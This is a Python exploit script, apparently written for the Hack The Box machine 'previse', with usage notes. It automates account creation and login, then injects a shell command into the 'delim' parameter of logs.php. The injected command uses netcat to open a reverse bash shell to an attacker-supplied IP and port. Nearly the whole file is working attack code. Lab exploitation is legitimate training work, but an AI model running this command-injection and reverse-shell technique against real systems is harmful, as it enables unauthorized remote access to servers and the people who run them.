#!/usr/bin/python3

# This script was created to automate getting a reverse shell in previse.htb machine via:
# + Create an regular account
# + Login and perform a command injection to spawn a reverse shell
# Author: @nightwolfx2

# Usage:
# On a separated terminal, start a netcat listener, example:
# $nc -l -p 9999 -v
#
# Run the exploit as follows:
# $ python3 previse.py http previse.htb 80 x.x.x.x yyyy
# [+] Target: http://previse.htb:80
# [+] Trying to add an user as follows admin1597:admin1597
# [+] User has been added successfully!
# [+] Trying to login with the credentials just created...
# [+] Trying to achieve remote code execution
# [+] Tty shell comming!
#
# Enjoy the reverse shell :)

import requests
import sys
from random import seed
from random import randint

def create_account(target):
        seed(randint)
        number=randint(0, 10000)
        user='admin' + str(number)
        password='admin' + str(number)
        success_string="User was added"
        print("[+] Trying to add an user as follows " + user + ":" + password)
        url = target + "/accounts.php"
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://previse.htb", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://previse.htb/accounts.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        data = "username=" + user + "&password=" + password + "&confirm=" + password + "&submit="
        sessions = session.post(url, headers=headers, data=data, allow_redirects=False)
        if success_string in sessions.text:
                print("[+] User has been added successfully!")
                return (user, password)
        else:
                print("[-] There was an error during the exploit execution...")
                exit(-1)

def login(target, user, password, session):
        print("[+] Trying to login with the credentials just created...")
        url = target + "/login.php"
        headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1", "Origin": "http://previse.htb", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Referer": "http://previse.htb/login.php", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        data = "username=" + user + "&password=" + password
        session = session.post(url, headers=headers, data=data, allow_redirects=False)
        return session

def rce(session, attacker_ip, attacker_port):
        print("[+] Trying to achieve remote code execution")
        #print(session.cookies.get_dict())
        url = target + "/logs.php"
        headers = {"Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
        data = {"delim": "comma&/bin/nc " + attacker_ip + " " + attacker_port + " -e /bin/bash|bash"}
        print("[+] Tty shell comming!")
        session.post(url, headers=headers, cookies=session.cookies.get_dict(), data=data, allow_redirects=False)

def main():
        print("Skeleton")

if __name__ == '__main__':
        session = requests.session()
        if len(sys.argv) != 6:
                print("[+] Usage: " + sys.argv[0] + " <http/https> <host> <port> <attacker_ip> <attacker_port>")
                print("[+] Eg: " + sys.argv[0] + " http target 80 x.x.x.x y.y.y.y")
                exit(-1)
        else:
                protocol=sys.argv[1]
                host=sys.argv[2]
                port=sys.argv[3]
                attacker_ip=sys.argv[4]
                attacker_port=sys.argv[5]
        target=protocol + "://" + host + ":" + port
        print("[+] Target: %s" % target)
        user, password = create_account(target)
        login(target, user, password, session)
        rce(session, attacker_ip, attacker_port)

